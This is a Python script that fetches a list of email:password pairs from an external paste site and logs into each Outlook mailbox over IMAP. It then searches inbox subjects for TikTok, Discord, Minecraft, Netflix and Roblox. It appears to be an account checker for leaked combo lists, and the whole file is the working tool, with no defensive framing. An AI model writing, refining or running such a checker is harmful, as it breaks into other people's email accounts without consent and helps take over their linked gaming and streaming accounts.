import imaplib
import email
from email.header import decode_header
import requests

# Function to connect to the email server and check for specific keywords
def check_email(username, password):
    try:
        # Connect to the server
        mail = imaplib.IMAP4_SSL("imap-mail.outlook.com")
        
        # Login to the account
        mail.login(username, password)
        
        # Select the mailbox you want to check (inbox)
        mail.select("inbox")
        
        # Search for all emails in the inbox
        status, messages = mail.search(None, "ALL")
        
        # Convert messages to a list of email IDs
        mail_ids = messages[0].split()
        
        # Keywords to search for
        keywords = ["TikTok", "Discord", "Minecraft", "Netflix", "Roblox"]
        
        # Check each email
        for mail_id in mail_ids:
            status, msg_data = mail.fetch(mail_id, "(RFC822)")
            msg = email.message_from_bytes(msg_data[0][1])
            
            # Decode the email subject
            subject, encoding = decode_header(msg["Subject"])[0]
            if isinstance(subject, bytes):
                subject = subject.decode(encoding if encoding else "utf-8")
            
            # Check for keywords in the subject
            for keyword in keywords:
                if keyword.lower() in subject.lower():
                    print(f"Keyword '{keyword}' found in email: {subject}")
        
        # Logout and close the connection
        mail.logout()
    except Exception as e:
        print(f"An error occurred: {e}")

# Fetch the email addresses and passwords from the provided URL
url = "https://pastefy.app/aTiG4Ij7/raw"
response = requests.get(url)
if response.status_code == 200:
    lines = response.text.splitlines()
    
    # Process each email
    for line in lines:
        email_info = line.strip().split(":")
        if len(email_info) == 2:
            username, password = email_info
            print(f"Checking email: {username}")
            check_email(username, password)
else:
    print(f"Failed to fetch email data. Status code: {response.status_code}")
